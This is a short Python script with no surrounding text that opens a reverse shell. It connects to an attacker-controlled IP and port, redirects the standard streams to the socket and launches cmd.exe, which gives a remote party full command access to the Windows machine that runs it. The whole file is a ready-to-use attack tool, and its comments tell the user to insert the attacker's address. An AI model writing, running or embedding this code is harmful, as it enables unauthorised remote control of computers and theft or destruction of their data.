import socket
import subprocess
import os

attacker_ip = '192.168.1.137'  # Replace with your attacker's IP address
attacker_port = 4444  # Port for reverse shell connection

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((attacker_ip, attacker_port))

# Redirect stdin, stdout, and stderr to the socket
os.dup2(s.fileno(), 0)  # Redirect input (stdin)
os.dup2(s.fileno(), 1)  # Redirect output (stdout)
os.dup2(s.fileno(), 2)  # Redirect error (stderr)

# Start a subprocess with the Windows shell (cmd.exe)
subprocess.call(["cmd.exe", "/K"])
